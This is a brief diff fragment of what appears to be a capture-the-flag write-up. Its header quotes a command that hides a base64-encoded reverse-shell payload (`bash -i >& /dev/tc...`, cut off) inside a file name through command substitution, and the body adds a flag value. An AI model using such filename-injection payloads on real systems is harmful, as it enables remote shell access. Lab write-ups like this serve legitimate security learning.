@@ -51,6 +51,7 @@ C:\home\radha\Desktop\ctf\part2> touch 'efg$(echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3Rj
  ![image](https://github.com/m0wn1ka/ctf/assets/127676379/456a8306-b9bc-45e1-a093-c8d3200946ad)
 
  
+ENV flag="0CTF{Congratulations_for_finding_the_flag}"
 
 
 
